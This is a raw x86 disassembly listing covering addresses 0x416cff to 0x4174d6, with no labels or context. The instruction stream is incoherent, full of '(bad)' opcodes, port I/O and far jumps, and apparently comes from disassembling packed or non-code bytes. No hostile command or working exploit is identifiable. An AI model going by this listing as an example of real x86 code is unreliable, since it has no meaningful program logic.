  416cff:	in     eax,0x67
  416d01:	int3   
  416d02:	mov    dh,0x96
  416d04:	add    bh,al
  416d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d07:	data16 add al,0x4d
  416d0a:	add    ebp,DWORD PTR [eax+0x1e9ba356]
  416d10:	iret   
  416d11:	lods   al,BYTE PTR ds:[esi]
  416d12:	mov    ebp,0x22a6bc41
  416d17:	in     eax,0x1b
  416d19:	nop
  416d1a:	dec    ecx
  416d1b:	mov    edi,0x70acbf1b
  416d20:	ja     0x416cea
  416d22:	xor    al,0x24
  416d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d25:	outs   dx,BYTE PTR ds:[esi]
  416d26:	cmp    dl,BYTE PTR [eax+0x1fcef14f]
  416d2c:	out    0x5d,al
  416d2e:	lahf   
  416d2f:	sbb    dl,bl
  416d31:	xor    al,0xc7
  416d33:	shl    bh,0x9c
  416d36:	rcr    DWORD PTR [ecx+0x2038599e],cl
  416d3c:	jmp    0x7203:0x2cb9889c
  416d43:	ds pop ecx
  416d45:	sub    cl,BYTE PTR [esi+0x7a]
  416d48:	repz sbb eax,0x99744330
  416d4e:	add    WORD PTR [edi+0x18586312],si
  416d55:	mov    bl,0x59
  416d57:	sbb    bh,cl
  416d59:	mov    ah,0xa9
  416d5c:	pop    es
  416d5d:	scas   al,BYTE PTR es:[edi]
  416d5e:	clc    
  416d5f:	xor    al,al
  416d61:	das    
  416d62:	jp     0x416d98
  416d64:	sbb    edx,edi
  416d66:	xchg   ecx,eax
  416d67:	pop    es
  416d68:	dec    ebx
  416d69:	xor    DWORD PTR [ebp-0x1a0d8aaa],edx
  416d6f:	or     DWORD PTR [eax],ecx
  416d71:	inc    edx
  416d72:	mov    bh,dl
  416d74:	pop    ss
  416d75:	push   edx
  416d76:	std    
  416d77:	push   edi
  416d78:	jp     0x416d1c
  416d7a:	fisttp WORD PTR [edx]
  416d7c:	in     eax,0x94
  416d7e:	inc    esp
  416d7f:	adc    al,0xaa
  416d81:	cld    
  416d82:	mov    WORD PTR [edx],cs
  416d84:	inc    esi
  416d85:	nop
  416d86:	imul   ecx,DWORD PTR [edx+0x7eb2fc73],0x374047ca
  416d90:	in     al,0x85
  416d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d93:	ror    BYTE PTR [ecx-0x1d],0xa4
  416d97:	mov    esi,0x64554de9
  416d9c:	fadd   DWORD PTR [bx+si]
  416d9f:	jecxz  0x416dd9
  416da1:	xor    al,0x13
  416da3:	(bad)  
  416da4:	bound  edx,QWORD PTR [edx+0x340041a2]
  416daa:	jae    0x416dd3
  416dac:	xchg   ecx,eax
  416dad:	nop
  416dae:	mov    ds:0x142ec2e9,eax
  416db3:	addr16 enter 0x360e,0x54
  416db8:	lahf   
  416db9:	ret    
  416dba:	addr16 cli 
  416dbc:	jecxz  0x416d9a
  416dbe:	mov    dl,BYTE PTR ds:0xbada508e
  416dc4:	ss jne 0x416d83
  416dc7:	jns    0x416d54
  416dc9:	mov    ah,0x1d
  416dcb:	loop   0x416e1e
  416dcd:	test   esp,esp
  416dcf:	arpl   WORD PTR [esi-0x72],bx
  416dd2:	cs jge 0x416d69
  416dd5:	(bad)  
  416dd6:	cwde   
  416dd7:	add    edi,0x16ae5522
  416ddd:	or     eax,edx
  416ddf:	ret    
  416de0:	popa   
  416de1:	inc    eax
  416de2:	add    al,0x77
  416de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416de5:	sub    al,0xdc
  416de7:	mov    edi,0x70762d15
  416dec:	or     al,0xe1
  416dee:	imul   DWORD PTR [edi]
  416df0:	dec    esi
  416df1:	and    edx,DWORD PTR [ecx+ecx*2]
  416df4:	or     eax,DWORD PTR [edi-0x59]
  416df7:	aaa    
  416df8:	bnd jne 0x416d9d
  416dfb:	fst    QWORD PTR [esi-0x13]
  416dfe:	inc    esi
  416dff:	jns    0x416df2
  416e01:	inc    esp
  416e02:	not    ch
  416e04:	pop    edx
  416e05:	movaps XMMWORD PTR [edx-0x69],xmm0
  416e09:	xchg   ebp,eax
  416e0a:	ret    0x85f2
  416e0d:	ret    0x9589
  416e10:	call   0x8eca:0x2902456c
  416e17:	sub    eax,0xb077a0b2
  416e1c:	push   edi
  416e1d:	pop    ebx
  416e1e:	cmp    dh,BYTE PTR [esi]
  416e20:	push   0xe923bdc7
  416e25:	(bad)  
  416e26:	push   DWORD PTR [edi-0x31]
  416e29:	add    eax,0xcc569707
  416e2e:	sbb    DWORD PTR [edx-0x3d068432],edx
  416e34:	xor    al,0x36
  416e36:	imul   esi,DWORD PTR [ebx+0x30bfaf6e],0x3dcaf6ed
  416e40:	add    dh,bl
  416e42:	cmp    eax,0xe671cbba
  416e47:	xchg   ecx,edi
  416e49:	mov    dh,0xbd
  416e4b:	stc    
  416e4c:	xor    ebx,DWORD PTR [ebp+0x26f7320a]
  416e52:	daa    
  416e53:	add    eax,0x8edaa87f
  416e58:	cmp    eax,0x9e61a028
  416e5d:	mov    esp,0x6080813f
  416e62:	mov    ecx,0xf4441533
  416e67:	sub    edi,DWORD PTR [edi+ecx*4]
  416e6a:	sar    DWORD PTR [edi],cl
  416e6c:	pop    esp
  416e6d:	stc    
  416e6e:	test   DWORD PTR [edx+edi*8],0xfe18b514
  416e75:	pop    esi
  416e76:	and    dh,al
  416e78:	xchg   ebp,eax
  416e79:	xor    al,0xde
  416e7b:	push   ebx
  416e7c:	nop
  416e7d:	mov    ds:0xc60e7e0,al
  416e82:	repz mov eax,0xe1dfd171
  416e88:	scas   al,BYTE PTR es:[edi]
  416e89:	or     BYTE PTR [ebx-0x8acb277],ah
  416e8f:	lea    esi,[eax]
  416e91:	cmp    al,0xbf
  416e93:	test   DWORD PTR [edi],ebx
  416e95:	rol    BYTE PTR [eax+0xe],0x18
  416e99:	sub    eax,0x2dbf8078
  416e9e:	imul   esp,DWORD PTR [ecx],0x6a3aebe1
  416ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ea5:	in     eax,dx
  416ea6:	loop   0x416e81
  416ea8:	(bad)  
  416ea9:	rcl    BYTE PTR [edi],1
  416eab:	pop    esi
  416eac:	pop    ebx
  416ead:	test   eax,0xf4302ac1
  416eb2:	push   ebx
  416eb3:	int3   
  416eb4:	fbstp  TBYTE PTR [eax-0x3ca770a9]
  416eba:	cmp    al,0x39
  416ebc:	jmp    0x860c:0x4ef4581b
  416ec3:	mov    bl,0xa3
  416ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ec6:	jl     0x416f26
  416ec8:	cwde   
  416ec9:	sub    BYTE PTR [edi+0x3b],al
  416ecc:	test   DWORD PTR [ecx+0x77],esi
  416ecf:	sbb    al,0x6e
  416ed1:	adc    ebp,DWORD PTR [ebp-0x44f09869]
  416ed7:	adc    cl,al
  416ed9:	fwait
  416eda:	push   edx
  416edb:	sbb    bl,bl
  416edd:	ins    DWORD PTR es:[edi],dx
  416ede:	and    BYTE PTR [ecx-0x65],bh
  416ee1:	dec    eax
  416ee2:	je     0x416eee
  416ee4:	stos   DWORD PTR es:[edi],eax
  416ee5:	xchg   BYTE PTR [esi+0x54],ch
  416ee8:	call   DWORD PTR [ebx]
  416eea:	fmul   QWORD PTR [edx-0x4c]
  416eed:	test   al,0xb
  416eef:	stos   BYTE PTR es:[edi],al
  416ef0:	xor    BYTE PTR [ebp+0x3e],bl
  416ef3:	(bad)  
  416ef4:	cmp    edi,0xf6b7d663
  416efa:	ja     0x416f56
  416efc:	daa    
  416efd:	or     bl,BYTE PTR [esi+0xb]
  416f00:	lods   eax,DWORD PTR ds:[esi]
  416f01:	adc    DWORD PTR [edx+0x6c],edx
  416f04:	pop    DWORD PTR [edx-0x6c]
  416f07:	inc    ebp
  416f08:	sahf   
  416f09:	add    DWORD PTR [ebx+0x25],esi
  416f0c:	sbb    DWORD PTR [eax+0x4f815ab3],ebp
  416f12:	sub    BYTE PTR [eax+ebp*4],cl
  416f15:	loope  0x416f17
  416f17:	inc    ebx
  416f18:	cmp    esi,DWORD PTR [ebp-0x6e]
  416f1b:	ins    DWORD PTR es:[edi],dx
  416f1c:	fld    QWORD PTR [edi-0x5e7c2744]
  416f22:	clc    
  416f23:	test   eax,0xb04fa1c6
  416f28:	push   esi
  416f29:	mov    al,0xf7
  416f2b:	(bad)  
  416f2c:	daa    
  416f2d:	xchg   esp,eax
  416f2e:	or     ecx,eax
  416f30:	in     eax,0xff
  416f32:	cmp    bh,dl
  416f34:	add    al,0xb3
  416f36:	cmp    bh,BYTE PTR [esi+0x6d]
  416f39:	cli    
  416f3a:	add    BYTE PTR [ebx-0x30],bh
  416f3d:	push   esi
  416f3e:	inc    ebp
  416f3f:	data16 sar BYTE PTR [ecx+edi*4],cl
  416f43:	stos   DWORD PTR es:[edi],eax
  416f44:	inc    esp
  416f45:	in     eax,0x75
  416f47:	xor    DWORD PTR ds:0x140eee38,edi
  416f4d:	test   BYTE PTR [edi],al
  416f4f:	in     al,dx
  416f50:	imul   edx,ebx,0xffffff89
  416f53:	push   ss
  416f54:	mov    eax,0xcba9de43
  416f59:	or     DWORD PTR [ebp-0x5a],0x28
  416f5d:	mov    esi,0x92fd0465
  416f62:	mov    ah,0x3b
  416f64:	lea    ebp,[edx+0x7c59f80a]
  416f6a:	pop    es
  416f6b:	push   edi
  416f6c:	lods   eax,DWORD PTR ds:[esi]
  416f6d:	out    dx,eax
  416f6e:	in     al,dx
  416f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f71:	lods   eax,DWORD PTR ds:[esi]
  416f72:	mov    eax,ds:0x7febfba6
  416f77:	mov    ecx,0xc21128de
  416f7c:	pop    ebp
  416f7d:	iret   
  416f7e:	or     eax,0xd8a7b845
  416f83:	mov    al,ds:0x64e24518
  416f88:	mov    DWORD PTR [esi+0x6c],ebp
  416f8b:	imul   eax,eax,0xd6d6154b
  416f91:	addr16 adc al,0x65
  416f94:	loope  0x416fbc
  416f96:	mov    edi,0x4934da54
  416f9b:	clc    
  416f9c:	loope  0x416fac
  416f9e:	popa   
  416f9f:	nop
  416fa0:	fst    DWORD PTR [edx-0x5fc36ec]
  416fa6:	mov    edi,0x3becb103
  416fab:	inc    ebx
  416fac:	arpl   WORD PTR [edx-0x6a],sp
  416faf:	cwde   
  416fb0:	mov    WORD PTR [ebx-0x556beafb],ds
  416fb6:	mov    cl,dh
  416fb8:	out    0xc1,eax
  416fba:	jne    0x416fb3
  416fbc:	out    0xb9,eax
  416fbe:	cmp    al,0x34
  416fc0:	out    dx,al
  416fc1:	inc    edi
  416fc2:	lock sti 
  416fc4:	xor    DWORD PTR [ebx+0x689d49e8],0x1ce025b4
  416fce:	jle    0x416fb3
  416fd0:	and    bh,BYTE PTR [eax+edx*8]
  416fd3:	out    dx,eax
  416fd4:	lods   al,BYTE PTR ds:[esi]
  416fd5:	sbb    esi,DWORD PTR [ebx+0x7e]
  416fd8:	pop    ecx
  416fd9:	xor    DWORD PTR [eax],edx
  416fdb:	cli    
  416fdc:	push   ecx
  416fdd:	mov    cl,0xe2
  416fdf:	iret   
  416fe0:	or     al,0xb9
  416fe2:	stos   BYTE PTR es:[edi],al
  416fe3:	mov    edx,0x82ec84b2
  416fe8:	cmp    al,0x4e
  416fea:	sbb    eax,DWORD PTR [esi+0x5d]
  416fed:	pusha  
  416fee:	mov    ebx,0xfa3b8251
  416ff4:	or     BYTE PTR [edi+0x53abbfdd],cl
  416ffa:	jg     0x416fd5
  416ffc:	je     0x416fbd
  416ffe:	sub    DWORD PTR [ebx+ebp*1],ebp
  417001:	jne    0x417050
  417003:	ret    
  417004:	xor    ebp,DWORD PTR [ecx+eax*4-0x1ce2ddeb]
  41700b:	inc    esp
  41700c:	and    esp,DWORD PTR [ebx-0x5]
  41700f:	loopne 0x416fee
  417011:	xchg   ebp,eax
  417012:	mov    cl,0x79
  417014:	neg    DWORD PTR [ebx+edi*1]
  417017:	and    esp,edi
  417019:	mov    al,0xe2
  41701b:	std    
  41701c:	and    ah,ch
  41701e:	add    al,0x2b
  417020:	inc    edi
  417021:	cmp    eax,0x7b3e29f4
  417026:	fwait
  417027:	cmc    
  417028:	xor    dl,ch
  41702a:	pop    edx
  41702b:	jle    0x417083
  41702d:	dec    eax
  41702e:	nop
  41702f:	sbb    DWORD PTR [ecx],esi
  417031:	or     BYTE PTR [ecx],ch
  417033:	and    DWORD PTR [eax],ebp
  417035:	js     0x416fba
  417037:	mov    bh,0x71
  417039:	sahf   
  41703a:	mov    ah,0xbe
  41703c:	dec    esi
  41703d:	bound  ebp,QWORD PTR [eax]
  41703f:	sub    ebp,DWORD PTR [di]
  417042:	push   ebx
  417043:	cwde   
  417044:	sbb    eax,0x91cb2035
  417049:	or     ch,bl
  41704b:	pop    esi
  41704c:	add    dh,BYTE PTR [ebx+0x58]
  41704f:	xor    al,BYTE PTR [esi+0x58995c3d]
  417055:	ss cs in al,0xa9
  417059:	les    ecx,FWORD PTR [edi]
  41705b:	(bad)  
  41705c:	retf   0x4bfa
  41705f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417060:	aaa    
  417061:	in     eax,0xc7
  417063:	scas   eax,DWORD PTR es:[edi]
  417064:	sti    
  417065:	out    dx,al
  417066:	test   DWORD PTR [esi-0x6397cf42],edx
  41706c:	push   edx
  41706d:	fdiv   DWORD PTR gs:[edi]
  417070:	sbb    eax,esi
  417072:	or     BYTE PTR [ebp-0x72],bh
  417075:	dec    esi
  417076:	fcom   DWORD PTR [ebp-0x9]
  417079:	jae    0x417044
  41707b:	ins    BYTE PTR es:[edi],dx
  41707c:	push   ebx
  41707d:	call   0x45d:0x952a98fa
  417084:	xor    DWORD PTR [edi],edx
  417086:	and    DWORD PTR ss:[ecx+0x45],ecx
  41708a:	adc    ebx,DWORD PTR [edx+0x22]
  41708d:	adc    bl,BYTE PTR [ecx+0x74301bf]
  417093:	popa   
  417094:	(bad)  
  417095:	mov    bl,0x69
  417097:	cmp    eax,0xa8de01fe
  41709c:	dec    eax
  41709d:	jae    0x417080
  41709f:	es cmp al,0x61
  4170a2:	mov    eax,cs
  4170a4:	mov    ds:0x378a5d45,eax
  4170a9:	adc    al,0xbc
  4170ab:	mov    esp,0x4857044c
  4170b0:	out    dx,al
  4170b1:	ds and ah,cl
  4170b4:	cld    
  4170b5:	mov    edx,0x996df680
  4170ba:	mov    edx,0x5e9d8396
  4170bf:	int    0x47
  4170c1:	pushf  
  4170c2:	jle    0x417056
  4170c4:	cs fsubr st,st(4)
  4170c7:	mov    esp,0x277729f9
  4170cc:	mov    ebp,0xecd46926
  4170d1:	and    BYTE PTR [eax],ah
  4170d3:	mov    ah,0xb0
  4170d5:	or     eax,0xdc961de1
  4170da:	sti    
  4170db:	popa   
  4170dc:	ja     0x417092
  4170de:	(bad)  
  4170df:	xor    BYTE PTR [ecx],ch
  4170e1:	adc    eax,0x8b3d0336
  4170e6:	pop    esp
  4170e7:	popa   
  4170e8:	jnp    0x41713d
  4170ea:	mov    bl,0x2d
  4170ec:	inc    esi
  4170ed:	popf   
  4170ee:	adc    al,0x4e
  4170f0:	pop    eax
  4170f1:	push   eax
  4170f2:	mov    DWORD PTR [ebx],edx
  4170f4:	dec    edx
  4170f5:	mov    es,WORD PTR [eax-0x776e0755]
  4170fb:	mov    ds:0xfd305c02,eax
  417100:	xchg   BYTE PTR [esi+0x8],dl
  417103:	call   0x905002ec
  417108:	pop    ebp
  417109:	xor    ebx,DWORD PTR [ecx]
  41710b:	adc    BYTE PTR cs:[eax],0xe9
  41710f:	pop    esp
  417110:	push   esp
  417111:	in     eax,dx
  417112:	or     ah,dl
  417114:	mov    al,0x49
  417116:	loope  0x41710c
  417118:	push   ebp
  417119:	repz loope 0x41716e
  41711c:	enter  0xcfd2,0x86
  417120:	popf   
  417121:	das    
  417122:	dec    ebx
  417123:	sub    bh,BYTE PTR [edi-0x52f9c25a]
  417129:	inc    ecx
  41712a:	lods   eax,DWORD PTR ds:[esi]
  41712b:	jmp    0x4356:0x5a0bd277
  417132:	cmp    bh,0x38
  417135:	mov    eax,ds:0xaa6356e9
  41713a:	fld    DWORD PTR [ecx]
  41713c:	mov    esi,es
  41713e:	inc    edx
  41713f:	xchg   ebp,eax
  417140:	jne    0x41711a
  417142:	jmp    0x41715b
  417144:	icebp  
  417145:	mov    ecx,0x12fefd80
  41714b:	push   ebp
  41714c:	push   ecx
  41714d:	pop    edi
  41714e:	mov    al,ds:0xd602f098
  417153:	mov    WORD PTR [edx],fs
  417155:	pop    edx
  417156:	shl    DWORD PTR [edi+edx*8],1
  417159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41715a:	arpl   WORD PTR ds:0xfcaa8288,cx
  417160:	inc    edx
  417161:	cdq    
  417162:	das    
  417163:	cmp    dh,BYTE PTR [edi+0x6cda2d43]
  417169:	dec    ebx
  41716a:	loop   0x4171c1
  41716c:	in     al,dx
  41716d:	adc    al,0xd2
  41716f:	mov    dl,0xdd
  417171:	dec    edx
  417172:	cmp    esp,DWORD PTR [edi]
  417174:	enter  0xe459,0x47
  417178:	shr    BYTE PTR [esi-0x40],cl
  41717b:	sub    DWORD PTR [ebx-0x62314c8d],esi
  417181:	stos   DWORD PTR es:[edi],eax
  417182:	jnp    0x4171d3
  417184:	adc    BYTE PTR [edi-0x73e16c34],bl
  41718a:	pop    ecx
  41718b:	icebp  
  41718c:	pop    edi
  41718d:	add    BYTE PTR [esi+eiz*4+0x29ebf289],dl
  417194:	data16 jb 0x4171dc
  417197:	push   ebx
  417198:	inc    ecx
  417199:	jmp    0x6682:0xf66cdb5a
  4171a0:	adc    BYTE PTR [eax+0x3e88b091],bh
  4171a6:	mov    esp,0x7eb3db62
  4171ab:	loop   0x417133
  4171ad:	out    dx,al
  4171ae:	or     eax,DWORD PTR [edx-0x3d1fb798]
  4171b4:	stc    
  4171b5:	sub    eax,0x18a9e68f
  4171ba:	sub    esi,0xec65f09e
  4171c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171c1:	daa    
  4171c2:	cmp    ebx,0x39fdd95b
  4171c8:	fimul  DWORD PTR [eax-0x18be52dd]
  4171ce:	cdq    
  4171cf:	push   0xffffffdf
  4171d1:	sti    
  4171d2:	std    
  4171d3:	sahf   
  4171d4:	pusha  
  4171d5:	or     bh,dl
  4171d7:	adc    eax,0x34e69335
  4171dc:	xchg   ebx,edi
  4171de:	lock repnz mov esi,0x35c5985c
  4171e5:	and    DWORD PTR [ecx],edi
  4171e7:	(bad)  
  4171e8:	jmp    0x417235
  4171ea:	in     eax,dx
  4171eb:	in     eax,dx
  4171ec:	jnp    0x4171fd
  4171ee:	or     BYTE PTR [edx+0xa],dl
  4171f1:	(bad)  
  4171f2:	outs   dx,DWORD PTR ds:[esi]
  4171f3:	push   es
  4171f4:	aad    0xf7
  4171f6:	xchg   esi,eax
  4171f7:	loop   0x4171e5
  4171f9:	and    ebx,ebp
  4171fb:	and    ebp,DWORD PTR [esi+eax*8]
  4171fe:	ins    DWORD PTR es:[edi],dx
  4171ff:	sar    DWORD PTR [edi],1
  417201:	jmp    0xf92d:0x87fd4f0
  417208:	inc    ecx
  417209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41720a:	rcl    BYTE PTR [ecx+0x3b2f7e31],cl
  417210:	arpl   WORD PTR [esi+0x6f],cx
  417213:	popa   
  417214:	ror    BYTE PTR [edx-0x6f],0xce
  417218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417219:	jl     0x41728d
  41721b:	shr    BYTE PTR [ecx],0x27
  41721e:	mov    eax,0x320185b
  417223:	push   ss
  417224:	lods   eax,DWORD PTR ds:[esi]
  417225:	push   edx
  417226:	pop    edx
  417227:	pop    eax
  417228:	aaa    
  417229:	into   
  41722a:	or     BYTE PTR [ebx+0x2179730f],ah
  417230:	sbb    eax,0x86763c1e
  417235:	imul   edi,ebx,0xd9bf2d7b
  41723b:	and    DWORD PTR [eax-0x55],ecx
  41723e:	rcl    DWORD PTR [edx],cl
  417240:	inc    ebp
  417241:	jne    0x4172b8
  417243:	ins    BYTE PTR es:[edi],dx
  417244:	adc    eax,0x96ba688e
  417249:	cmp    edx,DWORD PTR [esi+0x2a8e79f6]
  41724f:	ss push ecx
  417251:	push   0xffffffd7
  417253:	out    dx,eax
  417254:	push   eax
  417255:	(bad)  
  417256:	pop    ecx
  417257:	cmp    ch,BYTE PTR [edx+esi*8-0x59]
  41725b:	and    BYTE PTR [edx+0x4b62e4c8],dh
  417261:	loope  0x41726a
  417263:	or     eax,0x32925361
  417268:	into   
  417269:	and    edx,DWORD PTR ds:0xd9b6ab41
  41726f:	sub    eax,0x5bbea82f
  417274:	xchg   ebx,ebp
  417276:	enter  0x1826,0x3c
  41727a:	push   eax
  41727b:	pop    es
  41727c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41727d:	push   esi
  41727e:	leave  
  41727f:	mov    ds:0x2f6b8030,al
  417284:	jmp    FWORD PTR [edi]
  417286:	(bad)  [ebp*8+0x239999fc]
  41728d:	jne    0x417308
  41728f:	lds    eax,FWORD PTR [esp+edi*2]
  417292:	pop    edi
  417293:	cmp    eax,0x2ed7169c
  417298:	mov    al,0x70
  41729a:	loop   0x4172a9
  41729c:	jg     0x417298
  41729e:	push   eax
  41729f:	mov    ebp,DWORD PTR [ebx+0x38]
  4172a2:	sbb    BYTE PTR [ebx+0x28c02ee8],0x29
  4172a9:	push   0x5f
  4172ab:	add    DWORD PTR [edx-0x3eb02aea],ebx
  4172b1:	push   0xffffffde
  4172b3:	(bad)  [eax]
  4172b5:	cwde   
  4172b6:	inc    eax
  4172b7:	shr    DWORD PTR [edi+0x24],cl
  4172ba:	cmp    BYTE PTR [ebx-0x5],dh
  4172bd:	fisubr DWORD PTR [ecx+edx*8]
  4172c0:	fdiv   QWORD PTR [ebx]
  4172c2:	jmp    0x55e7664
  4172c7:	(bad)  
  4172c8:	in     eax,dx
  4172c9:	dec    esp
  4172cb:	mov    edx,0x11300855
  4172d0:	sahf   
  4172d1:	sbb    ebx,DWORD PTR [edx+0x36]
  4172d4:	call   0x9414f31a
  4172d9:	pop    ebx
  4172da:	or     al,ch
  4172dc:	mov    ds:0x4a1ef7eb,al
  4172e1:	sti    
  4172e2:	call   0x9ad3d849
  4172e7:	into   
  4172e8:	mov    dl,0x71
  4172ea:	jo     0x4172ac
  4172ec:	cmp    al,0x18
  4172ee:	in     al,dx
  4172ef:	pop    ecx
  4172f0:	cmp    cl,bh
  4172f2:	loop   0x4172e8
  4172f4:	xor    edx,DWORD PTR [ebx+0x16]
  4172f7:	inc    esi
  4172f8:	or     cl,al
  4172fa:	inc    BYTE PTR [edx+0x66]
  4172fd:	push   eax
  4172fe:	mov    dh,BYTE PTR [edx-0x6d]
  417301:	jecxz  0x417306
  417303:	mov    esp,0x3c44c664
  417308:	xchg   ebp,eax
  417309:	(bad)  [edi]
  41730b:	sub    ebp,DWORD PTR [ebx]
  41730d:	adc    al,0x9
  41730f:	cld    
  417310:	ds add eax,0xa9fc12b7
  417316:	outs   dx,DWORD PTR ds:[esi]
  417317:	xchg   ecx,eax
  417318:	mov    edi,0x85b442b0
  41731d:	(bad)  
  41731e:	in     al,0x99
  417320:	pop    esp
  417321:	lock mov ah,0x57
  417324:	call   0xe086ef4b
  417329:	push   cs
  41732a:	cmp    esp,DWORD PTR [edi]
  41732c:	test   esp,ecx
  41732e:	dec    eax
  41732f:	scas   al,BYTE PTR es:[edi]
  417330:	jg     0x4172e4
  417332:	and    DWORD PTR [ebp+0x76],0x535dbf9
  417339:	add    BYTE PTR [ebx],ch
  41733b:	adc    eax,0x74566ec3
  417340:	sbb    edi,ebx
  417342:	repnz mov ds:0x428fc6db,al
  417348:	jmp    0x9092:0x82baff1a
  41734f:	inc    esi
  417350:	jmp    0x493c5766
  417355:	inc    ebp
  417356:	out    dx,al
  417357:	sbb    al,0xe3
  417359:	cmp    DWORD PTR [ebp+ecx*1-0x26],ecx
  41735d:	ss ja  0x4173aa
  417360:	adc    DWORD PTR [edx+0x4be294f6],0xffffffa0
  417367:	and    BYTE PTR [ecx+0x37],ch
  41736a:	out    dx,al
  41736b:	sbb    eax,0xda3e1bf1
  417370:	xor    DWORD PTR [esi],0x5d
  417373:	xor    esi,DWORD PTR [edx+0x8]
  417376:	cmp    al,0xcc
  417378:	jmp    0x95eaad16
  41737d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41737e:	ret    0xba49
  417381:	imul   edi,DWORD PTR [eax-0x75539d08],0x695dd123
  41738b:	cmp    ch,dh
  41738d:	sub    al,0xca
  41738f:	and    al,0x6e
  417391:	std    
  417392:	mov    eax,0x4fd18792
  417397:	and    esi,DWORD PTR [ecx+0x6c]
  41739a:	shl    DWORD PTR [edi],0xc5
  41739d:	loopne 0x417321
  41739f:	and    al,0x31
  4173a1:	dec    eax
  4173a2:	jae    0x41732a
  4173a4:	jmp    0x27c1:0x197af148
  4173ab:	stos   DWORD PTR es:[edi],eax
  4173ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173ad:	jmp    0xe952:0x3e9f79a3
  4173b4:	in     eax,0x12
  4173b6:	and    bl,dl
  4173b8:	push   ds
  4173b9:	out    0x98,eax
  4173bb:	jmp    0x8290:0x9e3916e8
  4173c2:	push   eax
  4173c3:	mov    BYTE PTR [esi-0x2e2b0953],cl
  4173c9:	adc    dl,BYTE PTR [ecx]
  4173cb:	fwait
  4173cc:	and    eax,0xd185b2ca
  4173d1:	pusha  
  4173d2:	xchg   DWORD PTR [edx-0x6f6a1b78],esi
  4173d8:	or     esi,edx
  4173da:	or     eax,0xaf6b39c4
  4173df:	fsubr  st(4),st
  4173e1:	xor    bl,BYTE PTR [eax+0x3dc3b5fc]
  4173e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173e8:	retf   0x18c1
  4173eb:	sahf   
  4173ec:	dec    edi
  4173ed:	jbe    0x4173f5
  4173ef:	adc    eax,0xbfafec95
  4173f4:	outs   dx,DWORD PTR ds:[esi]
  4173f5:	scas   eax,DWORD PTR es:[edi]
  4173f6:	jo     0x4173f7
  4173f8:	repz jp 0x4173df
  4173fb:	rcl    DWORD PTR [edi],1
  4173fd:	sub    ebx,DWORD PTR [edx]
  4173ff:	repnz pop eax
  417401:	test   DWORD PTR [ecx+0x6d],esi
  417404:	dec    ebp
  417405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417406:	jb     0x41744b
  417408:	or     bh,BYTE PTR [edx+0x5b274e8b]
  41740e:	fwait
  41740f:	test   BYTE PTR [esi+0x19af96ca],0x1d
  417416:	in     al,0x2b
  417418:	push   ds
  417419:	jg     0x4173c0
  41741b:	and    esp,DWORD PTR [ecx]
  41741d:	int3   
  41741e:	cld    
  41741f:	sar    BYTE PTR [edx+0x6229fc3b],cl
  417425:	(bad)  
  417426:	in     al,dx
  417427:	(bad)  
  417429:	mov    ebp,0x9e1eccb3
  41742e:	cli    
  41742f:	dec    esp
  417430:	repnz stos BYTE PTR es:[edi],al
  417432:	in     eax,dx
  417433:	cli    
  417434:	sub    eax,esi
  417436:	mov    ebx,0x5873ba6d
  41743b:	je     0x4173dd
  41743d:	les    edi,FWORD PTR [edx+0x141e62aa]
  417443:	popa   
  417444:	clc    
  417445:	sub    BYTE PTR [esi-0x61],al
  417448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417449:	mov    ds:0xc9f28c93,eax
  41744e:	fs out dx,eax
  417450:	ins    BYTE PTR es:[edi],dx
  417451:	call   0x6bd517a9
  417456:	pop    ebp
  417457:	dec    eax
  417458:	out    0xf3,eax
  41745a:	inc    eax
  41745b:	cmp    al,0xcb
  41745d:	pop    edx
  41745e:	int3   
  41745f:	into   
  417460:	call   0x207c:0xf99079bd
  417467:	sub    edi,DWORD PTR [esi]
  417469:	hlt    
  41746a:	outs   dx,DWORD PTR ds:[esi]
  41746b:	ins    DWORD PTR es:[edi],dx
  41746c:	into   
  41746d:	push   ecx
  41746e:	xchg   ebp,eax
  417470:	cli    
  417471:	add    al,0x87
  417473:	pop    edi
  417474:	mov    BYTE PTR [esi+0x379d9e0f],ah
  41747a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41747b:	nop
  41747c:	outs   dx,BYTE PTR ds:[esi]
  41747d:	ret    0x959e
  417480:	in     eax,0xd8
  417482:	adc    DWORD PTR [ebp+0x38da0729],esi
  417488:	loopne 0x417452
  41748a:	retf   0x7c39
  41748d:	test   eax,0x60d3d3a
  417492:	mov    ds:0xd1e8ea1,al
  417497:	call   DWORD PTR [edi+0x21c1717e]
  41749d:	xor    cl,ch
  41749f:	imul   edx,ecx,0x7a534d2f
  4174a5:	test   dl,bh
  4174a7:	ds test esp,esi
  4174aa:	cdq    
  4174ab:	mov    ds:0x22fe278,al
  4174b0:	pop    ss
  4174b1:	stc    
  4174b2:	out    0x61,al
  4174b4:	fcmovnb st,st(4)
  4174b6:	aaa    
  4174b7:	sbb    al,0x99
  4174b9:	mov    ebx,0xec7bae8b
  4174be:	push   esp
  4174bf:	sbb    al,cl
  4174c1:	xchg   esp,eax
  4174c2:	adc    BYTE PTR [eax+0x1c],cl
  4174c5:	mov    bh,0xd3
  4174c7:	cmc    
  4174c8:	ja     0x4174ab
  4174ca:	adc    al,0xd1
  4174cc:	fmul   DWORD PTR [ebp+0xc]
  4174cf:	ret    0xb4ae
  4174d2:	(bad)  
  4174d3:	aad    0x62
  4174d5:	cwde   
  4174d6:	xchg   ecx,eax
